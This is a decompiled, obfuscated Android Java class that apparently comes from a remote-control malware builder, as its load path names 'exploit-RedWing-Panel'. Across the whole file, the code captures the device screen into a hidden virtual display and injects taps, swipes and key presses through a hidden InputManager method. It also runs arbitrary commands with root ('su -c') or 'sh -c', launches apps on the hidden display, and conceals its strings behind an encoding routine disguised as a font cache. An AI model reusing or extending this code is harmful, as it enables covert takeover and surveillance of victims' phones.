package v.s;

import android.content.Context;
import android.graphics.Bitmap;
import android.hardware.display.VirtualDisplay;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.os.SystemClock;
import android.view.Display;
import android.view.InputEvent;
import android.view.KeyEvent;
import android.view.MotionEvent;
import app.mobilex.plus.util.TypefaceCache;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class vatBtnIbOWqS8Z {
    public static int EWUjsTERgdPbSw3NNlN;
    public static final String K7eEOBPYP9VIoHWTe;
    public static volatile vatBtnIbOWqS8Z dTS0S7eC32ubQH54j36;
    public static int yTljMGnIibTRdOpSh4;
    public ubmqYDSfxvxS D5P1xCAyuvgF;
    public volatile Boolean DVTNwpDEVsUKuznof;
    public HandlerThread Ee8d2j4S9Vm5yGuR;
    public Object J0zjQ7CAgohuxU20eCW6;
    public ImageReader JXn4Qf7zpnLjP5;
    public Method MLSIo1htfMPWeB8V876L;
    public long Qrz92kRPw4GcghAc;
    public volatile boolean XiR1pIn5878vVWd;
    public final Context dDIMxZXP1V8HdM;
    public volatile int gIIiyi2ddlMDR0;
    public volatile int gmNWMfvn6zlEj;
    public volatile Boolean l1V0lQr6TbwNKqHfXNbb;
    public volatile long pyu8ovAipBTLYAiKab;
    public VirtualDisplay vekpFI4d1Nc4fakF;
    public final MediaProjection w9sT1Swbhx3hs;
    public Handler xDyLpEZyrcKVe0;
    public final AtomicBoolean ibVTtJUNfrGYbW = new AtomicBoolean(false);
    public final AtomicReference b1EoSIRjJHO5 = new AtomicReference(null);
    public volatile int hjneShqpF9Tis4 = -1;
    public final Handler wotphlvK9sPbXJ = new Handler(Looper.getMainLooper());
    public final long nQilHWaqS401ZtR = 33000000;
    public final drzny1wQFcvLKP H9XlUr4OeMJFiXK = new drzny1wQFcvLKP(1, this);

    static {
        TypefaceCache.obtain("000B007F005F008300F500B100F600AE003000660057008600E9");
        K7eEOBPYP9VIoHWTe = TypefaceCache.obtain("002B00600055008400CF00B700DB00A3002700730055");
        EWUjsTERgdPbSw3NNlN = 40;
        yTljMGnIibTRdOpSh4 = 480;
    }

    public vatBtnIbOWqS8Z(Context context, MediaProjection mediaProjection) {
        this.dDIMxZXP1V8HdM = context;
        this.w9sT1Swbhx3hs = mediaProjection;
    }

    public final boolean D5P1xCAyuvgF(int i, int i2, int i3, int i4, long j) {
        vatBtnIbOWqS8Z vatbtnibowqs8z;
        if (this.hjneShqpF9Tis4 < 0) {
            return false;
        }
        long jUptimeMillis = SystemClock.uptimeMillis();
        long j2 = j / ((long) 20);
        while (System.nanoTime() < 0) {
            String.valueOf(System.nanoTime());
        }
        float f = i;
        float f2 = i2;
        if (JXn4Qf7zpnLjP5(0, f, f2, jUptimeMillis, jUptimeMillis)) {
            int i5 = 1;
            while (true) {
                float f3 = i5 / 20;
                long j3 = (((long) i5) * j2) + jUptimeMillis;
                long j4 = j2;
                int i6 = i5;
                JXn4Qf7zpnLjP5(2, ((i3 - i) * f3) + f, ((i4 - i2) * f3) + f2, jUptimeMillis, j3);
                if (i6 == 20) {
                    break;
                }
                i5 = i6 + 1;
                j2 = j4;
            }
            vatbtnibowqs8z = this;
            if (vatbtnibowqs8z.JXn4Qf7zpnLjP5(1, i3, i4, jUptimeMillis, jUptimeMillis + j)) {
                TypefaceCache.obtain("003000610052009700F500FF00FD008C006300600052008600B000B600DC00AD00260075004F");
                return true;
            }
        } else {
            vatbtnibowqs8z = this;
        }
        TypefaceCache.obtain("003000610052009700F500FF00DB00A9002900730058009300B000B900D300AE002F0073005F00CB00B000AB00C000BE002A0078005C00C700E300B700D700AB002F");
        return vatbtnibowqs8z.b1EoSIRjJHO5(TypefaceCache.obtain("002A0078004B009200E400FF009F00EA0027007F0048009700FC00BE00CB00E7") + vatbtnibowqs8z.hjneShqpF9Tis4 + TypefaceCache.obtain("00630065004C008E00E000BA0092") + i + " " + i2 + " " + i3 + " " + i4 + " " + j);
    }

    public final boolean Ee8d2j4S9Vm5yGuR(int i) {
        int i2;
        if (this.hjneShqpF9Tis4 < 0) {
            return false;
        }
        if (w9sT1Swbhx3hs()) {
            try {
                long jUptimeMillis = SystemClock.uptimeMillis();
                i2 = i;
                try {
                    KeyEvent keyEvent = new KeyEvent(jUptimeMillis, jUptimeMillis, 0, i2, 0);
                    KeyEvent keyEvent2 = new KeyEvent(jUptimeMillis, ((long) 50) + jUptimeMillis, 1, i2, 0);
                    if (Build.VERSION.SDK_INT >= 29) {
                        try {
                            Method method = KeyEvent.class.getMethod(TypefaceCache.obtain("00300073004F00A300F900AC00C200AB0022006F00720083"), Integer.TYPE);
                            method.invoke(keyEvent, Integer.valueOf(this.hjneShqpF9Tis4));
                            method.invoke(keyEvent2, Integer.valueOf(this.hjneShqpF9Tis4));
                        } catch (Exception unused) {
                        }
                    }
                    boolean zBooleanValue = ((Boolean) this.MLSIo1htfMPWeB8V876L.invoke(this.J0zjQ7CAgohuxU20eCW6, keyEvent, 0)).booleanValue();
                    boolean zBooleanValue2 = ((Boolean) this.MLSIo1htfMPWeB8V876L.invoke(this.J0zjQ7CAgohuxU20eCW6, keyEvent2, 0)).booleanValue();
                    if (zBooleanValue && zBooleanValue2) {
                        TypefaceCache.obtain("00280073004200A200E600BA00DC00B3006B");
                        TypefaceCache.obtain("006A0036007400AC00B000A900DB00A60063007F0055008D00F500BC00C6");
                        return true;
                    }
                } catch (Exception e) {
                    e = e;
                    Exception exc = e;
                    TypefaceCache.obtain("002A00780051008200F300AB00F900A2003A0036005D008600F900B300D700A300790036");
                    exc.getMessage();
                }
            } catch (Exception e2) {
                e = e2;
                i2 = i;
            }
        } else {
            i2 = i;
        }
        return b1EoSIRjJHO5(TypefaceCache.obtain("002A0078004B009200E400FF009F00EA0027007F0048009700FC00BE00CB00E7") + this.hjneShqpF9Tis4 + TypefaceCache.obtain("0063007D005E009E00F500A900D700A900370036") + i2);
    }

    public final boolean JXn4Qf7zpnLjP5(int i, float f, float f2, long j, long j2) {
        if (!w9sT1Swbhx3hs()) {
            return false;
        }
        try {
            MotionEvent motionEventObtain = MotionEvent.obtain(j, j2, i, f, f2, 0);
            motionEventObtain.setSource(4098);
            if (Build.VERSION.SDK_INT >= 29) {
                try {
                    MotionEvent.class.getMethod(TypefaceCache.obtain("00300073004F00A300F900AC00C200AB0022006F00720083"), Integer.TYPE).invoke(motionEventObtain, Integer.valueOf(this.hjneShqpF9Tis4));
                } catch (Exception unused) {
                }
            }
            boolean zBooleanValue = ((Boolean) this.MLSIo1htfMPWeB8V876L.invoke(this.J0zjQ7CAgohuxU20eCW6, motionEventObtain, 0)).booleanValue();
            motionEventObtain.recycle();
            return zBooleanValue;
        } catch (Exception e) {
            TypefaceCache.obtain("002A00780051008200F300AB00FF00A80037007F0054008900B000B900D300AE002F0073005F00DD00B0");
            e.getMessage();
            return false;
        }
    }

    public final boolean b1EoSIRjJHO5(String str) {
        boolean zStartsWith = str.startsWith(TypefaceCache.obtain("002A0078004B009200E400FF009F00EA0027007F0048009700FC00BE00CB"));
        if (zStartsWith && okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(this.l1V0lQr6TbwNKqHfXNbb, Boolean.FALSE)) {
            TypefaceCache.obtain("0010007E005E008B00FC00FF00DB00A900330063004F00C700FB00B100DD00B0002D00360059009500FF00B400D700A9006F00360048008C00F900AF008800E7");
            return false;
        }
        Boolean bool = this.DVTNwpDEVsUKuznof;
        Boolean bool2 = Boolean.FALSE;
        if (!okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(bool, bool2) && zStartsWith) {
            try {
                if (Runtime.getRuntime().exec(new String[]{"su", "-c", str}).waitFor() == 0) {
                    Boolean bool3 = Boolean.TRUE;
                    this.DVTNwpDEVsUKuznof = bool3;
                    this.l1V0lQr6TbwNKqHfXNbb = bool3;
                    return true;
                }
                this.DVTNwpDEVsUKuznof = bool2;
            } catch (Exception unused) {
                this.DVTNwpDEVsUKuznof = Boolean.FALSE;
            }
        }
        try {
            Process processExec = Runtime.getRuntime().exec(new String[]{"sh", "-c", str});
            int iWaitFor = processExec.waitFor();
            if (iWaitFor != 0) {
                KgSM0TsKUpCiuePB.uW0IRoPBZMj2QmBkkp(RIZfHbqXpth8r2yN4.pyu8ovAipBTLYAiKab(new BufferedReader(new InputStreamReader(processExec.getErrorStream(), N4h1mGVqsY6M8lTtB.dDIMxZXP1V8HdM), 8192))).toString();
                TypefaceCache.obtain("0010007E005E008B00FC00FF00E9");
                TypefaceCache.obtain("001E0036005E009F00F900AB008F");
                if (zStartsWith) {
                    this.l1V0lQr6TbwNKqHfXNbb = Boolean.FALSE;
                }
            } else if (zStartsWith) {
                this.l1V0lQr6TbwNKqHfXNbb = Boolean.TRUE;
            }
            return iWaitFor == 0;
        } catch (Exception e) {
            TypefaceCache.obtain("0010007E005E008B00FC00FF00D700BF00260075001B008200E200AD00DD00B50063004D");
            TypefaceCache.obtain("001E002C001B");
            e.getMessage();
            if (!zStartsWith) {
                return false;
            }
            this.l1V0lQr6TbwNKqHfXNbb = Boolean.FALSE;
            return false;
        }
    }

    public final void dDIMxZXP1V8HdM() {
        try {
            ImageReader imageReader = this.JXn4Qf7zpnLjP5;
            if (imageReader != null) {
                imageReader.setOnImageAvailableListener(null, null);
            }
        } catch (Exception unused) {
        }
        try {
            VirtualDisplay virtualDisplay = this.vekpFI4d1Nc4fakF;
            if (virtualDisplay != null) {
                virtualDisplay.release();
            }
        } catch (Exception unused2) {
        }
        try {
            ImageReader imageReader2 = this.JXn4Qf7zpnLjP5;
            if (imageReader2 != null) {
                imageReader2.close();
            }
        } catch (Exception unused3) {
        }
        try {
            HandlerThread handlerThread = this.Ee8d2j4S9Vm5yGuR;
            if (handlerThread != null) {
                handlerThread.quitSafely();
            }
        } catch (Exception unused4) {
        }
        this.vekpFI4d1Nc4fakF = null;
        this.JXn4Qf7zpnLjP5 = null;
        this.Ee8d2j4S9Vm5yGuR = null;
        this.xDyLpEZyrcKVe0 = null;
        this.b1EoSIRjJHO5.set(null);
    }

    public final VirtualDisplay hjneShqpF9Tis4(int i, int i2) {
        int i3;
        int i4;
        luaqjdyAZfxbSO5UD luaqjdyazfxbso5ud = new luaqjdyAZfxbSO5UD((-98) + 99, this);
        for (yI1KTRoNlsjx yi1ktronlsjx : Aqh0grSwgDbwr.yTljMGnIibTRdOpSh4(new yI1KTRoNlsjx(TypefaceCache.obtain("00130044007E00B400D5009100E600EC000C00410075"), 10), new yI1KTRoNlsjx(TypefaceCache.obtain("00130043007900AB00D9009C0099008800140058"), Integer.valueOf((-13) + 22)), new yI1KTRoNlsjx(TypefaceCache.obtain("00130044007E00B400D5009100E600860017005F007400A9"), 2), new yI1KTRoNlsjx(TypefaceCache.obtain("00130043007900AB00D9009C"), 1), new yI1KTRoNlsjx(TypefaceCache.obtain("000D0059006400A100DC009E00F50094"), 0))) {
            int iIntValue = ((Number) yi1ktronlsjx.vekpFI4d1Nc4fakF).intValue();
            try {
                TypefaceCache.obtain("001700640042008E00FE00B8009200A400310073005A009300F5008900DB00B500370063005A008B00D400B600C100B7002F0077004200C700E700B600C600AF006300700057008600F700AC008F");
                i3 = i;
                i4 = i2;
                try {
                    VirtualDisplay virtualDisplayCreateVirtualDisplay = this.w9sT1Swbhx3hs.createVirtualDisplay(K7eEOBPYP9VIoHWTe, i3, i4, this.dDIMxZXP1V8HdM.getResources().getDisplayMetrics().densityDpi, iIntValue, this.JXn4Qf7zpnLjP5.getSurface(), luaqjdyazfxbso5ud, this.wotphlvK9sPbXJ);
                    if (virtualDisplayCreateVirtualDisplay != null) {
                        TypefaceCache.obtain("0015007F0049009300E500BE00DE0083002A0065004B008B00F100A6009200A400310073005A009300F500BB009200B0002A0062005300C700F600B300D300A00030002B");
                        TypefaceCache.obtain("006F0036005F008E00E300AF00DE00A6003A005F005F00DA");
                        Display display = virtualDisplayCreateVirtualDisplay.getDisplay();
                        if (display != null) {
                            display.getDisplayId();
                        }
                        return virtualDisplayCreateVirtualDisplay;
                    }
                    continue;
                } catch (SecurityException e) {
                    e = e;
                    SecurityException securityException = e;
                    TypefaceCache.obtain("001000730058009200E200B600C600BE0006006E0058008200E000AB00DB00A8002D0036004C008E00E400B7009200A1002F0077005C009400AD");
                    securityException.getMessage();
                } catch (Exception e2) {
                    e = e2;
                    Exception exc = e;
                    TypefaceCache.obtain("0006006E0058008200E000AB00DB00A8002D0036004C008E00E400B7009200A1002F0077005C009400AD");
                    exc.getMessage();
                }
            } catch (SecurityException e3) {
                e = e3;
                i3 = i;
                i4 = i2;
            } catch (Exception e4) {
                e = e4;
                i3 = i;
                i4 = i2;
            }
            i = i3;
            i2 = i4;
        }
        return null;
    }

    public final boolean ibVTtJUNfrGYbW(String str) {
        if (this.hjneShqpF9Tis4 < 0) {
            return false;
        }
        return b1EoSIRjJHO5(TypefaceCache.obtain("0022007B001B009400E400BE00C000B30063003B0016008300F900AC00C200AB0022006F001B") + this.hjneShqpF9Tis4 + TypefaceCache.obtain("0063003B005A00C700F100B100D600B5002C007F005F00C900F900B100C600A2002D00620015008600F300AB00DB00A8002D0038006D00AE00D50088009200EA002700360019") + str + "\"");
    }

    public final void pyu8ovAipBTLYAiKab() {
        if (this.ibVTtJUNfrGYbW.getAndSet(false)) {
            dTS0S7eC32ubQH54j36 = null;
            this.hjneShqpF9Tis4 = -1;
            dDIMxZXP1V8HdM();
            TypefaceCache.obtain("001000620054009700E000BA00D6");
        }
    }

    public final void vekpFI4d1Nc4fakF(int i, int i2) {
        try {
            Bitmap bitmapCreateBitmap = Bitmap.createBitmap(i, i2, Bitmap.Config.ARGB_8888);
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(1024);
            bitmapCreateBitmap.compress(Bitmap.CompressFormat.JPEG, 30, byteArrayOutputStream);
            bitmapCreateBitmap.recycle();
            this.b1EoSIRjJHO5.set(byteArrayOutputStream.toByteArray());
            this.pyu8ovAipBTLYAiKab++;
            TypefaceCache.obtain("000400730055008200E200BE00C600A2002700360052008900F900AB00DB00A6002F00360059008B00F100BC00D900E700250064005A008A00F500FF");
            byteArrayOutputStream.size();
            TypefaceCache.obtain("006300740042009300F500AC009E00E700240073005500DA");
        } catch (Exception e) {
            TypefaceCache.obtain("002400730055008200E200BE00C600A20001007A005A008400FB009900C000A6002E0073001B008200E200AD00DD00B500790036");
            e.getMessage();
        }
    }

    public final boolean w9sT1Swbhx3hs() {
        if (this.XiR1pIn5878vVWd) {
            return true;
        }
        try {
            Class<?> cls = Class.forName(TypefaceCache.obtain("00220078005F009500FF00B600D600E9002B00770049008300E700BE00C000A2006D007F0055009700E500AB009C008E002D0066004E009300DD00BE00DC00A6002400730049"));
            this.J0zjQ7CAgohuxU20eCW6 = cls.getMethod(TypefaceCache.obtain("00240073004F00AE00FE00AC00C600A6002D0075005E"), null).invoke(null, null);
            this.MLSIo1htfMPWeB8V876L = cls.getMethod(TypefaceCache.obtain("002A00780051008200F300AB00FB00A900330063004F00A200E600BA00DC00B3"), InputEvent.class, Integer.TYPE);
            this.XiR1pIn5878vVWd = true;
            TypefaceCache.obtain("000A0078004B009200E4009200D300A900220071005E009500B000B600DC00AD00260075004F008800E200FF00C000A2002200720042");
        } catch (Exception e) {
            TypefaceCache.obtain("000A0078004B009200E4009200D300A900220071005E009500B000B600DC00AE00370036005D008600F900B300D700A300790036");
            e.getMessage();
        }
        return this.XiR1pIn5878vVWd;
    }

    public final boolean xDyLpEZyrcKVe0(String str, String str2) {
        if (this.hjneShqpF9Tis4 < 0) {
            return false;
        }
        if (str2 != null) {
            return b1EoSIRjJHO5(TypefaceCache.obtain("0022007B001B009400E400BE00C000B30063003B0016008300F900AC00C200AB0022006F001B") + this.hjneShqpF9Tis4 + TypefaceCache.obtain("0063003B005500C7") + str + "/" + str2);
        }
        return b1EoSIRjJHO5(TypefaceCache.obtain("002E00790055008C00F500A6009200EA006E00720052009400E000B300D300BE0063") + this.hjneShqpF9Tis4 + TypefaceCache.obtain("0063003B004B00C7") + str + TypefaceCache.obtain("0063003B005800C700F100B100D600B5002C007F005F00C900F900B100C600A2002D00620015008400F100AB00D700A0002C0064004200C900DC009E00E700890000005E007E00B500B000EE"));
    }
}
